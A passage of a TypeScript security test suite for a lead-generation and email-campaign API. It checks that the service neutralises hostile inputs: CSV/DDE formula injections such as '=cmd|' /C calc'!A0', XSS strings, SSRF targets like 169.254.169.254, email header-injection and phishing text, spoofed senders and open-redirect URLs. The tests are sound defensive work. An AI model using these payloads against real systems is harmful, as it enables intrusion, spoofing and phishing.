      const wrapped = (cause: unknown) => Object.assign(new Error(`Failed query: insert into "users" ("id", "email", "password_hash") values (default, $1, $2)\nparams: victim@example.com,${hash}`), { cause, query: 'insert into "users" ...', params: ["victim@example.com", hash] });
      h.get("/nul", () => {
        throw wrapped(driver);
      });
      h.get("/boom", () => {
        throw wrapped(new Error("connection terminated unexpectedly"));
      });
      const logged: string[] = [];
      const spy = vi.spyOn(console, "error").mockImplementation((...a: unknown[]) => void logged.push(a.map((x) => (typeof x === "string" ? x : JSON.stringify(x, Object.getOwnPropertyNames(x ?? {})))).join(" ")));
      try {
        const nul = await h.request("/nul");
        expect(nul.status).toBe(400);
        const nulBody = await nul.text();
        expect(JSON.parse(nulBody).error.code).toBe("bad_request");
        expect(nulBody).not.toMatch(/insert into|victim@example.com|\$2a\$/);

        const boom = await h.request("/boom");
        expect(boom.status).toBe(500);
        const boomBody = await boom.text();
        expect(boomBody).not.toMatch(/insert into|victim@example.com|\$2a\$/);
        expect(logged).toHaveLength(1);
        expect(logged[0]).toMatch(/\[api\] unhandled GET \/boom/);
        expect(logged[0]).toMatch(/connection terminated unexpectedly/);
        expect(logged[0]).not.toMatch(/insert into|victim@example.com|\$2a\$|params/);
      } finally {
        spy.mockRestore();
      }
      expect(describeError(wrapped(driver))).toMatchObject({ code: "22021" });
      expect(redactMessage(`Failed query: insert into "users" values ($1) params: a@b.co,${hash}`)).not.toMatch(/a@b\.co|\$2a\$|insert into/);
      expect(redactMessage(`bad token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop for a@b.co`)).not.toMatch(/eyJ|a@b\.co/);
    });
  });

  // ── 5. CSV formula guard ──
  describe("CSV export (C6)", () => {
    it("defuses a formula hidden behind leading whitespace or a newline, and leaves phone numbers alone", async () => {
      const { csvCell } = await import("./lib/csv.js");
      expect(csvCell(" =1+1")).toBe(`"' =1+1"`);
      expect(csvCell("\n=cmd|' /C calc'!A0")).toBe(`"'\n=cmd|' /C calc'!A0"`);
      expect(csvCell("\t=1+1")).toMatch(/^"'/);
      expect(csvCell("\r\n @SUM(1)")).toMatch(/^"'/);
      expect(csvCell(" +cmd|x")).toMatch(/^"'/);
      expect(csvCell("  -2+3+cmd|' /C calc'!A0")).toMatch(/^"'/);
      expect(csvCell("=HYPERLINK(1)")).toBe(`"'=HYPERLINK(1)"`);
      // not formulas
      expect(csvCell("+14155550100")).toBe('"+14155550100"');
      expect(csvCell(" +1 (415) 555-0100")).toBe('" +1 (415) 555-0100"');
      expect(csvCell("-5")).toBe('"-5"');
      expect(csvCell("Head of Sales")).toBe('"Head of Sales"');
      expect(csvCell("")).toBe('""');
      expect(csvCell(null)).toBe('""');
    });

    it("the export route applies it to every cell", async () => {
      const tag = `fx-${u8()}`;
      await lead(A.orgId, { title: " =1+1", firstName: "\n=cmd|x", phone: "+1 (415) 555-0100", location: "\t@SUM(A1)", tags: [tag] });
      const res = await req("GET", `/v1/leads/export.csv?tag=${tag}`, A.token);
      expect(res.status).toBe(200);
      expect(res.headers.get("content-type")).toMatch(/text\/csv/);
      expect(res.headers.get("x-content-type-options")).toBe("nosniff");
      const { parseCsvRows } = await import("./lib/csv.js");
      const cells = parseCsvRows(res.text).slice(1).flat();
      const live = cells.filter((c) => /^[\s\u0000-\u001f]*[=+\-@]/.test(c) && !/^[+-]?[\d\s().-]+$/.test(c.trim()));
      expect(live).toEqual([]);
      expect(cells).toContain("+1 (415) 555-0100");
    });
  });

  // ── 6. Company name ──
  describe("shared company rows (C7)", () => {
    it("an import row fills an empty company name but never renames the company for everyone else", async () => {
      const t = u8();
      const domain = `shared-${t}.example.com`;
      await importCsv(A.token, `name,email,company,website\nFirst ${t},first-${t}@example.com,Real Corp ${t},${domain}\n`);
      await importCsv(A.token, `name,email,company,website\nSecond ${t},second-${t}@example.com,RENAMED BY IMPORT,${domain}\n`);
      const [co] = await db.select().from(S.companies).where(S.and(S.eq(S.companies.orgId, A.orgId), S.eq(S.companies.domain, domain)));
      expect(co.name).toBe(`Real Corp ${t}`);
      // Neither does editing one lead.
      const [l] = await db.select().from(S.leads).where(S.and(S.eq(S.leads.orgId, A.orgId), S.eq(S.leads.email, `second-${t}@example.com`)));
      expect((await req("PATCH", `/v1/leads/${l.id}`, A.token, { companyDomain: domain, companyName: "RENAMED BY PATCH" })).status).toBe(200);
      expect((await db.select().from(S.companies).where(S.eq(S.companies.id, co.id)))[0].name).toBe(`Real Corp ${t}`);
      // An explicit rename (the crawl of the company's own site) still works.
      const { upsertCompany } = await import("./services/leads.js");
      expect((await upsertCompany(A.orgId, domain, { name: "Crawled Name" }, { rename: true })).name).toBe("Crawled Name");
      expect((await upsertCompany(A.orgId, domain, { name: "Again" })).name).toBe("Crawled Name");
      // So does a crawled profile (what the enrichment jobs pass), without being told to.
      expect((await upsertCompany(A.orgId, domain, { name: "From The Site", description: "We make things", emailsFound: [], socials: {} })).name).toBe("From The Site");
      expect((await upsertCompany(A.orgId, domain, { name: "Not This", description: "x" }, { rename: false })).name).toBe("From The Site");
      // And an empty name is filled.
      const fresh = `fresh-${t}.example.com`;
      await upsertCompany(A.orgId, fresh, {});
      expect((await upsertCompany(A.orgId, fresh, { name: "Filled" })).name).toBe("Filled");
    });
  });

  // ── 7. The public pixel ──
  describe("public pixel (C9)", () => {
    let px: any;
    const visitJobs = (orgId: string) => sql`SELECT type, payload FROM jobs WHERE org_id = ${orgId} AND type IN ('visit.identify', 'company.enrich') ORDER BY created_at`;
    const collect = (key: string, body: unknown, headers: Record<string, string> = {}) => app.request(`/px/${key}/collect`, { method: "POST", headers: { "content-type": "application/json", "cf-connecting-ip": "203.0.113.77", ...headers }, body: typeof body === "string" ? body : JSON.stringify(body) });

    beforeAll(async () => {
      px = (await req("POST", "/v1/visitors/pixels", A.token, { name: "Site" })).body;
    });

    it("serves the snippet only for a real key, with the key encoded and nosniff set", async () => {
      const ok = await app.request(`/px/${px.key}.js`);
      expect(ok.status).toBe(200);
      expect(ok.headers.get("content-type")).toMatch(/^application\/javascript/);
      expect(ok.headers.get("x-content-type-options")).toBe("nosniff");
      const js = await ok.text();
      expect(js).toContain(`/px/${px.key}/collect`);
      for (const evil of [`x");alert(document.domain);//`, `px_"+alert(1)+"`, `</script><script>alert(1)</script>`, "px_", "anything", `px_${"a".repeat(200)}`]) {
        const res = await app.request(`/px/${encodeURIComponent(evil)}.js`);
        expect({ evil, status: res.status }).toEqual({ evil, status: 404 });
        // Whatever the 404 says, it is not served as script.
        expect(res.headers.get("content-type") ?? "").not.toMatch(/javascript/);
      }
      const { pixelScript } = await import("./services/visitors.js");
      expect(pixelScript(`x");alert(1);//`)).not.toContain("alert(1)");
    });

    it("bounds every field of a beacon before it is stored or queued", async () => {
      const sid = `sid-${u8()}`;
      // A megabyte-sized beacon: refused outright by the body limit, or accepted and cut.
      const huge = await collect(px.key, { sid: `huge-${sid}` + "S".repeat(1_000_000), id: { junk: "J".repeat(2_000_000) } });
      expect([204, 413]).toContain(huge.status);
      expect((await sql`SELECT coalesce(max(length(session_id)),0)::int AS n FROM visits WHERE pixel_id = ${px.id}`)[0].n).toBeLessThanOrEqual(200);
      // One that fits under any body limit, with every field far longer than it may be stored.
      const res = await collect(px.key, { sid: sid + "S".repeat(1000), p: "/p" + "P".repeat(4000), r: "https://r.example/" + "R".repeat(4000), t: "T".repeat(500), e: "identify", d: 1e15, id: { email: `a@big-${u8()}.example.com`, company: "C".repeat(3000), junk: "J".repeat(3000), nested: { deep: "x".repeat(2000) } } }, { "user-agent": "U".repeat(5000) });
      expect(res.status).toBe(204);
      const rows = await sql`SELECT session_id, page, referrer, user_agent, duration_ms FROM visits WHERE pixel_id = ${px.id} AND session_id LIKE ${sid + "%"}`;
      expect(rows).toHaveLength(1);
      expect(rows[0].session_id.length).toBeLessThanOrEqual(200);
      expect(rows[0].page.length).toBeLessThanOrEqual(2000);
      expect(rows[0].referrer.length).toBeLessThanOrEqual(2000);
      expect(rows[0].user_agent.length).toBeLessThanOrEqual(300);
      expect(rows[0].duration_ms).toBeLessThanOrEqual(86_400_000);
      const biggest = await sql`SELECT coalesce(max(length(payload::text)),0)::int AS n FROM jobs WHERE org_id = ${A.orgId} AND type = 'visit.identify'`;
      expect(biggest[0].n).toBeLessThan(1500);
      // An unknown or malformed key is answered like any other and stores nothing.
      const before = (await sql`SELECT count(*)::int AS n FROM visits WHERE org_id = ${A.orgId}`)[0].n;
      expect((await collect("px_does_not_exist_0000", { sid: "x" })).status).toBe(204);
      expect((await collect(`px_"><script>`, { sid: "x" })).status).toBeLessThan(500);
      expect((await sql`SELECT count(*)::int AS n FROM visits WHERE org_id = ${A.orgId}`)[0].n).toBe(before);
    });

    it("an identify() for an IP, a port, a path or an internal name creates no company and queues no crawl", async () => {
      const { identifyVisit } = await import("./services/visitors.js");
      const O = await signup("px-ssrf");
      const p = (await req("POST", "/v1/visitors/pixels", O.token, { name: "S" })).body;
      for (const host of ["169.254.169.254", "internal.service.local", "localhost:5432/x?y", "10.0.0.5", "[::1]", "metadata.google.internal", "evil.example.com:8080/admin"]) {
        const [v] = await db.insert(S.visits).values({ orgId: O.orgId, pixelId: p.id, sessionId: `s-${u8()}`, ipHash: "h", page: "/" }).returning();
        // Called the way the job calls it; the IP lookup has no answer (fetch is blocked),
        // so with the claim refused there is nothing to place the visit by.
        await identifyVisit(v.id, "203.0.113.9", { email: `a@${host}`, company: `Fake ${host}` }).catch(() => null);
      }
      expect(await db.select().from(S.companies).where(S.eq(S.companies.orgId, O.orgId))).toEqual([]);
      expect(await db.select().from(S.visitorCompanies).where(S.eq(S.visitorCompanies.orgId, O.orgId))).toEqual([]);
      expect((await visitJobs(O.orgId)).filter((j: any) => j.type === "company.enrich")).toEqual([]);
    });

    it("a stranger's identify() cannot name or rename a company", async () => {
      const { identifyVisit } = await import("./services/visitors.js");
      const O = await signup("px-name");
      const p = (await req("POST", "/v1/visitors/pixels", O.token, { name: "S" })).body;
      const domain = `bigco-${u8()}.example.com`;
      const [existing] = await db.insert(S.companies).values({ orgId: O.orgId, domain, name: "BigCo Inc" }).returning();
      const visit = async () => (await db.insert(S.visits).values({ orgId: O.orgId, pixelId: p.id, sessionId: `s-${u8()}`, ipHash: "h", page: "/pricing" }).returning())[0];
      const r = await identifyVisit((await visit()).id, "203.0.113.9", { email: `ceo@${domain}`, company: `=HYPERLINK("http://evil") PWNED\r\nBY A STRANGER` });
      expect(r).toMatchObject({ domain });
      expect((await db.select().from(S.companies).where(S.eq(S.companies.id, existing.id)))[0].name).toBe("BigCo Inc");
      // A company it creates gets no name from the claim either; the crawl names it.
      const fresh = `newco-${u8()}.example.com`;
      await identifyVisit((await visit()).id, "203.0.113.9", { email: `x@${fresh}`, company: "Stranger Says" });
      const [made] = await db.select().from(S.companies).where(S.and(S.eq(S.companies.orgId, O.orgId), S.eq(S.companies.domain, fresh)));
      expect(made.name).toBeNull();
      // The label kept on the visitor row is one line, with no control characters.
      const [vc] = await db.select().from(S.visitorCompanies).where(S.and(S.eq(S.visitorCompanies.orgId, O.orgId), S.eq(S.visitorCompanies.domain, domain)));
      expect(vc.name).toBe("BigCo Inc");
      const [vc2] = await db.select().from(S.visitorCompanies).where(S.and(S.eq(S.visitorCompanies.orgId, O.orgId), S.eq(S.visitorCompanies.domain, fresh)));
      expect(vc2.name).toBe("Stranger Says");
      const { cleanIdentify } = await import("./services/visitors.js");
      const cleaned = cleanIdentify({ email: " CEO@Example.com ", company: `Line one\r\nBcc: x\u0000${"C".repeat(5000)}`, extra: { a: 1 } })!;
      expect(cleaned.email).toBe("ceo@example.com");
      expect(cleaned.company).not.toMatch(/[\r\n\u0000]/);
      expect(cleaned.company!.length).toBeLessThanOrEqual(200);
      expect(Object.keys(cleaned).sort()).toEqual(["company", "email"]);
      expect(cleanIdentify({ email: "a@b.co, c@d.co" })).toBeUndefined();
    });

    it("caps how many companies identify() can create per hour; past it the visit is recorded and nothing else", async () => {
      const { identifyVisit, NEW_VISITOR_COMPANIES_PER_HOUR } = await import("./services/visitors.js");
      const O = await signup("px-cap");
      const p = (await req("POST", "/v1/visitors/pixels", O.token, { name: "S" })).body;
      await db.insert(S.visitorCompanies).values(Array.from({ length: NEW_VISITOR_COMPANIES_PER_HOUR }, (_, i) => ({ orgId: O.orgId, domain: `seed${i}-${u8()}.example.com`, visits: 1, sessions: 1 })));
      const jobsBefore = (await visitJobs(O.orgId)).length;
      const flood = `flood-${u8()}.example.com`;
      const [v] = await db.insert(S.visits).values({ orgId: O.orgId, pixelId: p.id, sessionId: `s-${u8()}`, ipHash: "h", page: "/" }).returning();
      const r = await identifyVisit(v.id, "203.0.113.9", { email: `a@${flood}`, company: "Flood" });
      expect(r).toMatchObject({ rateLimited: true, domain: flood });
      expect(await db.select().from(S.companies).where(S.and(S.eq(S.companies.orgId, O.orgId), S.eq(S.companies.domain, flood)))).toEqual([]);
      expect(await db.select().from(S.visitorCompanies).where(S.and(S.eq(S.visitorCompanies.orgId, O.orgId), S.eq(S.visitorCompanies.domain, flood)))).toEqual([]);
      expect((await visitJobs(O.orgId)).length).toBe(jobsBefore);
      // The visit itself still says which company it claimed to be.
      expect((await db.select().from(S.visits).where(S.eq(S.visits.id, v.id)))[0].companyDomain).toBe(flood);
    });
  });

  // ── 8. Platform mail ──
  describe("platform mail (C10)", () => {
    it("limits invitation emails per address and per workspace", async () => {
      const O = await signup("inv-limit");
      const target = `victim-${u8()}@example.net`;
      const inv = await req("POST", "/v1/tools/team/invite", O.token, { email: target });
      expect(inv.status).toBe(201);
      const statuses: number[] = [];
      for (let i = 0; i < 6; i++) statuses.push((await req("POST", `/v1/tools/team/invites/${inv.body.id}/resend`, O.token)).status);
      // 1 create + 2 re-sends = 3 to this address in the hour; the rest are refused.
      expect(statuses).toEqual([200, 200, 429, 429, 429, 429]);
      expect(mocks.sent.filter((m) => m.to === target)).toHaveLength(3);
      // A different workspace cannot top the same address up.
      const P = await signup("inv-limit2");
      expect((await req("POST", "/v1/tools/team/invite", P.token, { email: target })).status).toBe(429);
      // Per workspace: 20 an hour (the member invite at signup was the first).
      const codes: number[] = [];
      for (let i = 0; i < 22; i++) {
        const r = await req("POST", "/v1/tools/team/invite", P.token, { email: `bulk-${i}-${u8()}@example.net` });
        codes.push(r.status);
        if (r.status === 201) await req("DELETE", `/v1/tools/team/invites/${r.body.id}`, P.token); // free the seat
      }
      expect(codes.filter((c) => c === 201)).toHaveLength(19);
      expect(codes.slice(19)).toEqual([429, 429, 429]);
    });

    it("keeps links and control characters out of the invitation subject", async () => {
      const O = await signup("inv-subject");
      await db.update(S.organizations).set({ name: "ACTION REQUIRED - your mailbox is suspended, sign in at https://phish.example/login now\r\nBcc: x@evil.example" }).where(S.eq(S.organizations.id, O.orgId));
      await db.update(S.users).set({ name: "Scout Security http://evil.example/reset www.evil.example\nX-Injected: 1" }).where(S.eq(S.users.id, O.userId));
      const to = `s-${u8()}@example.net`;
      expect((await req("POST", "/v1/tools/team/invite", O.token, { email: to })).status).toBe(201);
      const m = mocks.sent.filter((x) => x.to === to).at(-1)!;
      expect(m.subject).not.toMatch(/https?:|phish\.example\/|www\.|[\r\n]/);
      expect(m.subject).toMatch(/on Scout$/);
      expect(m.subject.length).toBeLessThanOrEqual(200);
      // The only link in the body is the invite link.
      expect((m.text.match(/https?:\/\/\S+/g) ?? []).every((l) => l.includes("/join?token="))).toBe(true);
    });

    it("sends search alerts only to a member of the workspace", async () => {
      const ext = await req("POST", "/v1/tools/saved-searches", A.token, { name: "URGENT: verify your account at https://phish.example", query: { query: "cto" }, alert: true, alertEmail: "stranger-victim@example.net" });
      expect(ext.status).toBe(400);
      expect(ext.body.error.message).toMatch(/member of this workspace/);
      const member = await req("POST", "/v1/tools/saved-searches", A.token, { name: "ok", query: { query: "cto" }, alert: true, alertEmail: A.memberEmail.toUpperCase() });
      expect(member.status).toBe(201);
      expect(member.body.alertEmail).toBe(A.memberEmail);
      // Alerts on with no address: the creator's.
      const mine = await req("POST", "/v1/tools/saved-searches", A.token, { name: "mine", query: { query: "cto" }, alert: true });
      expect(mine.body.alertEmail).toBe(A.email);
      // Another workspace's member is a stranger here.
      expect((await req("POST", "/v1/tools/saved-searches", A.token, { name: "x", query: { query: "cto" }, alert: true, alertEmail: B.email })).status).toBe(400);
    });

    it("the platform sender always sends from the platform's address, with a clean display name", async () => {
      const r = await req("POST", "/v1/campaigns/email-accounts", A.token, { provider: "system", fromName: 'Scout Billing\r\nBcc: bcc-victim@evil.example\r\nX-Injected: yes', fromEmail: "billing@platform-domain.example", replyTo: undefined });
      expect(r.status).toBe(201);
      const acct = r.body.emailAccount;
      expect(acct.fromEmail).toBe("no-reply@platform.test");
      expect(acct.fromName).not.toMatch(/[\r\n<>",;]/);
      expect(acct.replyTo).toBe(A.email);
      expect(r.body.note).toMatch(/always sends from no-reply@platform\.test/);
      // A display name that smuggles a second mailbox is flattened.
      const two = await req("POST", "/v1/campaigns/email-accounts", A.token, { provider: "system", fromName: "CEO <ceo@bigbank.example>, Real", fromEmail: A.email });
      expect(two.status).toBe(201);
      expect(two.body.emailAccount.fromName).not.toMatch(/[<>",;]/);
      expect(two.body.emailAccount.fromEmail).toBe("no-reply@platform.test");
      expect(two.body.emailAccount.replyTo).toBe(A.email);
      // Reply-To must be someone in the workspace.
      const ext = await req("POST", "/v1/campaigns/email-accounts", A.token, { provider: "system", fromName: "N", fromEmail: A.email, replyTo: "attacker@evil.example" });
      expect(ext.status).toBe(400);
      expect(ext.body.error.message).toMatch(/member of this workspace/);
      const member = await req("POST", "/v1/campaigns/email-accounts", A.token, { provider: "system", fromName: "N", fromEmail: A.email, replyTo: A.memberEmail });
      expect(member.body.emailAccount.replyTo).toBe(A.memberEmail);
      // An API key has no user: the workspace owner is the fallback.
      const viaKey = await req("POST", "/v1/campaigns/email-accounts", A.apiKey, { provider: "system", fromName: "Key", fromEmail: "whoever@elsewhere.example" });
      expect(viaKey.status).toBe(201);
      expect(viaKey.body.emailAccount).toMatchObject({ fromEmail: "no-reply@platform.test", replyTo: A.email });
      // A fromName that is nothing but separators is refused, not stored empty.
      expect((await req("POST", "/v1/campaigns/email-accounts", A.token, { provider: "system", fromName: '<>",;', fromEmail: A.email })).status).toBe(400);
    });
  });

  // ── 9. Webhook secrets and integration config ──
  describe("webhooks and integrations (A4/D6)", () => {
    it("shows a webhook secret once, stores it encrypted, and never lists it", async () => {
      const made = await req("POST", "/v1/webhooks", A.token, { url: "https://hooks.example.com/in" });
      expect(made.status).toBe(201);
      expect(made.body.secret).toMatch(/^whsec_/);
      expect(made.body).toMatchObject({ signatureVersion: 2, secretPreview: `${made.body.secret.slice(0, 6)}...${made.body.secret.slice(-4)}` });
      expect(made.body.secretEncrypted).toBeUndefined();
      const [row] = await db.select().from(S.webhooks).where(S.eq(S.webhooks.id, made.body.id));
      expect(row.secret).toBeNull();
      expect(row.secretEncrypted).toBeTruthy();
      expect(row.secretEncrypted).not.toContain(made.body.secret);
      expect(row.signatureVersion).toBe(2);
      const { webhookSecret } = await import("./lib/webhookSecret.js");
      expect(webhookSecret(row)).toBe(made.body.secret);

      // A legacy hook (plaintext, v1) keeps working and is not exposed either.
      const [legacy] = await db.insert(S.webhooks).values({ orgId: A.orgId, url: "https://legacy.example.com/in", secret: "legacy-plaintext-secret-000000", signatureVersion: 1 }).returning();
      expect(webhookSecret(legacy)).toBe("legacy-plaintext-secret-000000");
      expect(() => webhookSecret({ secret: null, secretEncrypted: null })).toThrow();

      for (const token of [A.token, A.memberToken, A.apiKey]) {
        const list = await req("GET", "/v1/webhooks", token);
        expect(list.status).toBe(200);
        expect(list.text).not.toContain(made.body.secret);
        expect(list.text).not.toContain("legacy-plaintext-secret-000000");
        for (const h of list.body.webhooks) {
          expect(h.secret).toBeUndefined();
          expect(h.secretEncrypted).toBeUndefined();
          expect(h.secretPreview).toMatch(/^.{6}\.\.\..{4}$/);
          expect([1, 2]).toContain(h.signatureVersion);
        }
      }

      // Rotation: a new v2 secret, the old one gone, legacy upgraded.
      const rot = await req("POST", `/v1/webhooks/${legacy.id}/rotate-secret`, A.token);
      expect(rot.status).toBe(200);
      expect(rot.body).toMatchObject({ id: legacy.id, signatureVersion: 2 });
      expect(rot.body.secret).toMatch(/^whsec_/);
      const [after] = await db.select().from(S.webhooks).where(S.eq(S.webhooks.id, legacy.id));
      expect(after).toMatchObject({ secret: null, signatureVersion: 2 });
      expect(webhookSecret(after)).toBe(rot.body.secret);
      expect((await req("POST", `/v1/webhooks/${randomUUID()}/rotate-secret`, A.token)).status).toBe(404);
      expect((await req("POST", `/v1/webhooks/${legacy.id}/rotate-secret`, B.token)).status).toBe(404);
    });

    it("refuses an integration whose base URL is not the provider's", async () => {
      const zoho = await req("PUT", "/v1/integrations/zoho", A.token, { config: { accessToken: "t", apiDomain: "http://127.0.0.1:9/internal?x=" } });
      expect(zoho.status).toBe(400);
      const pd = await req("PUT", "/v1/integrations/pipedrive", A.token, { config: { apiToken: "t", companyDomain: "169.254.169.254/latest/meta-data/?x=" } });
      expect(pd.status).toBe(400);
      const hook = await req("PUT", "/v1/integrations/webhook", A.token, { config: { url: "http://169.254.169.254/latest/meta-data/" } });
      expect(hook.status).toBe(400);
      expect(await db.select().from(S.integrations).where(S.eq(S.integrations.orgId, A.orgId))).toEqual([]);
    });
  });

  // ── 10. Role gates ──
  describe("role gates (A6)", () => {
    it("keeps sender, share-link, integration-sync and webhook-rotation changes to owners and admins", async () => {
      const O = await signup("roles");
      const client = await req("POST", "/v1/clients", O.token, { name: `C ${u8()}` });
      const sender = await req("POST", "/v1/campaigns/email-accounts", O.token, { provider: "system", fromName: "S", fromEmail: O.email });
      const hook = await req("POST", "/v1/webhooks", O.token, { url: "https://hooks.example.com/in" });
      await req("PUT", "/v1/integrations/hubspot", O.token, { config: { accessToken: "t" } });
      const l = await lead(O.orgId);
      const attempts: [string, string, unknown?][] = [
        ["POST", "/v1/campaigns/email-accounts", { provider: "system", fromName: "M", fromEmail: O.memberEmail }],
        ["DELETE", `/v1/campaigns/email-accounts/${sender.body.emailAccount.id}`],
        ["POST", `/v1/clients/${client.body.id}/share`, {}],
        ["DELETE", `/v1/clients/${client.body.id}/share`],
        ["POST", "/v1/integrations/hubspot/sync", { leadIds: [l.id] }],
        ["POST", `/v1/webhooks/${hook.body.id}/rotate-secret`, {}],
      ];
      for (const [m, p, b] of attempts) {
        const r = await req(m, p, O.memberToken, b);
        expect({ m, p, status: r.status, code: r.body?.error?.code }).toEqual({ m, p, status: 403, code: "forbidden_role" });
      }
      // Nothing changed.
      expect((await db.select().from(S.emailAccounts).where(S.eq(S.emailAccounts.orgId, O.orgId)))).toHaveLength(1);
      expect((await db.select().from(S.clients).where(S.eq(S.clients.id, client.body.id)))[0].shareToken).toBeNull();
      // An API key is an org-level credential an owner created: it passes, as before.
      expect((await req("POST", `/v1/clients/${client.body.id}/share`, O.apiKey, {})).status).toBe(200);
      expect((await req("POST", `/v1/webhooks/${hook.body.id}/rotate-secret`, O.apiKey, {})).status).toBe(200);
      expect((await req("POST", "/v1/integrations/hubspot/sync", O.apiKey, { leadIds: [l.id] })).status).toBe(202);
      // Members still do the day-to-day work.
      expect((await req("GET", "/v1/leads/export.csv", O.memberToken)).status).toBe(200);
      expect((await req("GET", "/v1/campaigns/email-accounts", O.memberToken)).status).toBe(200);
      expect((await req("GET", "/v1/webhooks", O.memberToken)).status).toBe(200);
    });
  });

  // ── 11. Inbound replies ──
  describe("inbound replies (D5)", () => {
    it("takes the sender from the mailbox, not from the display name", async () => {
      const { parseSender } = await import("./routes/campaigns.js");
      expect(parseSender('"ceo@bigprospect.test" <attacker@evil.example>')).toBe("attacker@evil.example");
      expect(parseSender("Jane Doe <Jane@Example.com>")).toBe("jane@example.com");
      expect(parseSender("  jane@example.com ")).toBe("jane@example.com");
      expect(parseSender("<a@example.com> <b@example.com>")).toBe("b@example.com");
      for (const bad of ["ceo@bigprospect.test attacker@evil.example", "Jane <jane@example.com> trailing", "Jane <jane@example.com", "jane@example.com>", "a@example.com, b@example.com", "not an address", ""]) expect({ bad, out: parseSender(bad) }).toEqual({ bad, out: null });

      const t = u8();
      const ceo = await lead(A.orgId, { email: `ceo-${t}@bigprospect.test`, fullName: "The CEO" });
      const forged = await req("POST", "/v1/campaigns/inbound", A.token, { from: `"ceo-${t}@bigprospect.test" <attacker-${t}@evil.example>`, text: "unsubscribe me", subject: "unsubscribe" });
      expect(forged.status).toBe(200);
      expect(forged.body.matched).toBe(false);
      const after = (await db.select().from(S.leads).where(S.eq(S.leads.id, ceo.id)))[0];
      expect(after.status).toBe("new");
      expect(after.tags).toEqual([]);
      expect(await db.select().from(S.suppressions).where(S.and(S.eq(S.suppressions.orgId, A.orgId), S.eq(S.suppressions.email, ceo.email)))).toEqual([]);
      // Unparseable sender: refused, not guessed at.
      expect((await req("POST", "/v1/campaigns/inbound", A.token, { from: `ceo-${t}@bigprospect.test and friends`, text: "unsubscribe" })).status).toBe(400);
      // The real person still can.
      const real = await req("POST", "/v1/campaigns/inbound", A.token, { from: `The CEO <CEO-${t}@bigprospect.test>`, text: "Please unsubscribe me", subject: "re" });
      expect(real.body).toMatchObject({ matched: true, intent: "unsubscribe" });
      expect(await db.select().from(S.suppressions).where(S.and(S.eq(S.suppressions.orgId, A.orgId), S.eq(S.suppressions.email, ceo.email)))).toHaveLength(1);
    });

    it("a failing classifier does not drop the reply: the sequence still stops", async () => {
      const t = u8();
      const l = await lead(A.orgId, { email: `reply-${t}@example.com` });
      const [cp] = await db.insert(S.campaigns).values({ orgId: A.orgId, name: "Seq", status: "active" }).returning();
      const [cc] = await db.insert(S.campaignContacts).values({ campaignId: cp.id, leadId: l.id, status: "active", currentStep: 0, nextSendAt: new Date(Date.now() + 86_400_000) }).returning();
      mocks.classifyThrows = 1;
      const r = await req("POST", "/v1/campaigns/inbound", A.token, { from: l.email, text: "Sounds good, let's talk next week.", subject: "re: hello" });
      expect(r.status).toBe(200);
      expect(r.body.matched).toBe(true);
      expect(r.body.intent).toBe("interested");
      expect(r.body.skipped).toBe("ai_unavailable");
      expect((await db.select().from(S.campaignContacts).where(S.eq(S.campaignContacts.id, cc.id)))[0]).toMatchObject({ status: "replied", nextSendAt: null });
      expect(mocks.classifyThrows).toBe(0);
    });

    it("holds the classifier's answer to the known intents before storing it", async () => {
      const t = u8();
      const l = await lead(A.orgId, { email: `intent-${t}@example.com` });
      mocks.classifyReturns = { intent: `x"]},'<script>alert(1)</script> ${"z".repeat(5000)}`, confidence: 42 };
      try {
        const r = await req("POST", "/v1/campaigns/inbound", A.token, { from: l.email, text: "hello there", subject: "re" });
        expect(r.status).toBe(200);
        expect(r.body).toMatchObject({ matched: true, intent: "other", confidence: 1 });
      } finally {
        mocks.classifyReturns = null;
      }
      const after = (await db.select().from(S.leads).where(S.eq(S.leads.id, l.id)))[0];
      expect(after.tags).toEqual(["replied:other"]);
      const [msg] = await db.select().from(S.messages).where(S.and(S.eq(S.messages.orgId, A.orgId), S.eq(S.messages.leadId, l.id)));
      expect(msg.intent).toBe("other");
    });
  });

  // ── 12. Click redirect ──
  describe("click redirect (D8)", () => {
    it("redirects only to a URL that is exactly one of the message's links", async () => {
      const token = `tk-${randomBytes(12).toString("hex")}`;
      const tracked = (u: string) => `https://api.scout.test/t/c/${token}?u=${encodeURIComponent(u)}`;
      await db.insert(S.messages).values({
        orgId: A.orgId,
        toEmail: "x@example.com",
        subject: "s",
        bodyText: "See https://tenantco.com and https://tenantco.com/pricing?a=1&b=2. Unsubscribe: https://api.scout.test/t/u/abc",
        bodyHtml: `<p><a href="${tracked("https://tenantco.com")}">home</a> <a href="${tracked("https://tenantco.com/pricing?a=1&amp;b=2")}">pricing</a> <a href="https://api.scout.test/t/u/abc">unsubscribe</a></p>`,
        trackingToken: token,
        status: "sent",
      });
      const go = async (u: string) => {
        const res = await app.request(`/t/c/${token}?u=${encodeURIComponent(u)}`);
        return { status: res.status, location: res.headers.get("location") };
      };
      expect(await go("https://tenantco.com")).toEqual({ status: 302, location: "https://tenantco.com/" });
      expect(await go("https://tenantco.com/pricing?a=1&b=2")).toEqual({ status: 302, location: "https://tenantco.com/pricing?a=1&b=2" });
      // what a mail client sends when the href carried &amp;
      expect(await go("https://tenantco.com/pricing?a=1&amp;b=2")).toEqual({ status: 302, location: "https://tenantco.com/pricing?a=1&b=2" });
      for (const evil of [
        "https://tenantco.co", // a prefix of a linked host
        "https://tenantco.c",
        "https://t",
        "https://api.scout.te", // a prefix of our own unsubscribe link's host
        "https://tenantco.com.evil.example",
        "https://tenantco.com@evil.example",
        "https://tenantco.com/pricing?a=1&b=2&next=https://evil.example",
        "https://tenantco.com/pricin",
        "http://tenantco.com",
        "https://evil.example/pay?acct=1",
        "javascript:alert(1)",
        "//evil.example",
        "",
      ]) expect({ evil, ...(await go(evil)) }).toEqual({ evil, status: 404, location: null });
      expect((await app.request(`/t/c/not-a-token?u=${encodeURIComponent("https://tenantco.com")}`)).status).toBe(404);
    });
  });

  // ── 13. Org-scoped joins behind references ──
  describe("references are read inside the workspace (A5)", () => {
    it("a lead pointing at another workspace's company comes back without it", async () => {
      const marker = `foreign-co-${u8()}`;
      const [theirs] = await db.insert(S.companies).values({ orgId: B.orgId, domain: `${marker}.example.com`, name: marker, industry: `${marker}-industry` }).returning();
      const tag = `x-${u8()}`;
      const mine = await lead(A.orgId, { companyId: theirs.id, tags: [tag], firstName: "Ann", lastName: "Lee" });
      const list = await req("GET", `/v1/leads?tag=${tag}`, A.token);
      expect(list.body.leads).toHaveLength(1);
      expect(list.body.leads[0].company).toBeNull();
      expect(list.text).not.toContain(marker);
